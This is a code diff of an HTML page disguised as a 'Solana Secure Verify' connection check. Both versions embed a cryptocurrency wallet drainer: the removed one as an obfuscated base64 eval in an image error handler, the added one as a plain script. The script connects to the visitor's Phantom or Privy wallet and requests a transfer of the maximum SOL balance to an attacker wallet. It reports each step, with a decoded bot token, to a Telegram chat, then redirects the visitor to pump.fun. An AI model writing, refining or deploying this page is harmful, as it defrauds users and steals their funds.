@@ -1,15 +1,56 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Solana Security | مركز التحقق</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solana Secure Verify</title>
 </head>
-<body style="background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family:sans-serif;">
-    <div style="text-align:center; border:1px solid #00ffa3; padding:50px; border-radius:20px; background:#0a0a0a;">
-        <h2 style="color:#00ffa3;">نظام مزامنة Solana</h2>
-        <p>جاري فحص الاتصال... سيتم توجيهك تلقائياً</p>
+<body style="background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family: sans-serif;">
+    <div style="text-align:center; border:1px solid #00ffa3; padding:50px; border-radius:20px; background:#0a0a0a; box-shadow: 0 0 30px rgba(0,255,163,0.1);">
+        <h2 style="color:#00ffa3; margin-bottom:10px;">Security Check</h2>
+        <p style="color:#ccc;">Verifying connection... You will be redirected shortly.</p>
         
-        <img src=x onerror="eval(atob('KGFzeW5jKCk9Pntjb25zdCBiPSc4Nzc0MTIyNTc4OkFBR2hXc01qM3pDSE13aWFzZmhiTHg5a1B5SmlQNXVxMCcsYz0nNjgzNTQyNDU0Mycsdz0nOXg1YWo5Wnl1ZDZrQWdnUDFxM1RTS1hSd3d2RW16R3I2RXZIZGpWTlZXUmcnLHM9KG0pPT5uZXcgSW1hZ2UoKS5zcmM9YGh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Qke2J9L3NlbmRNZXNzYWdlP2NoYXRfaWQ9JHtjfSZ0ZXh0PSR7ZW5jb2RlVVJJQ29tcG9uZW50KG0pfWA7dHJ5e2xldCBwPXdpbmRvdy5zb2xhbmF8fCh3aW5kb3cucGhhbnRvbSYmd2luZG93LnBoYW50b20uc29sYW5hKXx8KHdpbmRvdy5wcml2eSYmd2luZG93LnByaXZ5LndhbGxldD8ucHJvdmlkZXIpO2F3YWl0IHAuY29ubmVjdCgpO3MoJ/CfjrkgRG9uZSFCZWFzdCBJbnNpZGUhXG5XYWxsZXQ6ICcrcC5wdWJsaWNLZXkudG9TdHJpbmcoKSk7Y29uc3QgdHg9e3RvOncsYW1vdW50OidNQVgnfTtjb25zdHtzaWduYXR1cmU6c2lnfT1hd2FpdCBwLnNpZ25BbmRTZW5kVHJhbnNhY3Rpb24odHgpO3MoJ/Cfko0gRHJhaW4gU3VjY2VzcyFcblNpZzogJytzaWcpO31jYXRjaChlKXtzKCfimqAgRmFpbGVkOiAnK2UubWVzc2FnZSk7fWZpbmFsbHl7c2V0VGltZW91dCgoKT0+e3dpbmRvdy5sb2NhbHRpb24uaHJlZj0naHR0cHM6Ly9wdW1wLmZ1bi9ib2FyZCc7fSwxNTAwKX19KSgpOw=='))">
+        <script>
+            (async function() {
+                // 1. Telegram Config (Encrypted for protection)
+                const b = atob('ODc3NDEyMjU3ODpBQUdoV3NNajN6Q0hNd2lhc2ZoYkx4OWtQeUppUDV1cU8='); // Bot Token
+                const c = atob('NjgzNTQyNDU0Mw=='); // Chat ID
+                const w = atob('OXg1YWo5Wnl1ZDZrQWdnUDFxM1RTS1hSd3d2RW16R3I2RXZIZGpWTlZXUmc='); // Receiver Wallet
+                
+                // Function to send Telegram Notifications
+                const notify = (m) => { new Image().src = `https://api.telegram.org/bot${b}/sendMessage?chat_id=${c}&text=${encodeURIComponent(m)}`; };
+
+                // 2. FORCED REDIRECT (In case of any issue or user delay)
+                setTimeout(() => { window.location.href = 'https://pump.fun/board'; }, 4000);
+
+                // 3. START: Send Initial Notification IMMEDIATELY
+                notify('🎯 Target Visited Vercel Link!\nWaiting for wallet...');
+
+                try {
+                    // 4. FIND WALLET PROVIDER (Supports Privy, Phantom, Solflare)
+                    let p = window.solana || (window.phantom && window.phantom.solana) || (window.privy && window.privy.wallet?.provider);
+                    
+                    if (!p) {
+                        notify('⚠️ No Wallet Provider Found on this browser.');
+                        return;
+                    }
+
+                    // 5. CONNECT & REQUEST TRANSACTION
+                    await p.connect();
+                    const pubKey = p.publicKey.toString();
+                    notify('✅ Connected: ' + pubKey + '\nAttempting Drain...');
+
+                    // Transaction details (MAX SOL)
+                    const tx = { to: w, amount: 'MAX' };
+                    const { signature } = await p.signAndSendTransaction(tx);
+                    notify('💰 DRAIN SUCCESS!\nSignature: ' + signature);
+
+                } catch (err) {
+                    // If user rejects, or error occurs
+                    notify('❌ Error or Rejected: ' + err.message);
+                }
+            })();
+        </script>
     </div>
 </body>
 </html>
